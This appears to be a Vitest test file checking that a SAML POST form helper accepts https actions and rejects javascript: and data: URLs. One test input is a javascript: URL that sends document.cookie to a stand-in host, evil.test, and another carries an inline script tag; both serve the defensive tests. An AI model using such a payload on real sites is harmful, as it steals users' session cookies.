import { describe, expect, it } from "vitest";
import { createSAMLPostForm } from "./helpers";

describe("createSAMLPostForm", () => {
	it("emits an http(s) form action", async () => {
		const res = createSAMLPostForm(
			"https://idp.example.com/slo",
			"SAMLResponse",
			"base64value",
		);
		const html = await res.text();
		expect(html).toContain('action="https://idp.example.com/slo"');
	});

	it("rejects a javascript: form action", () => {
		expect(() =>
			createSAMLPostForm(
				"javascript:fetch('https://evil.test/x?c='+document.cookie)",
				"SAMLResponse",
				"base64value",
			),
		).toThrow();
	});

	it("rejects a data: form action", () => {
		expect(() =>
			createSAMLPostForm(
				"data:text/html,<script>1</script>",
				"SAMLResponse",
				"base64value",
			),
		).toThrow();
	});
});
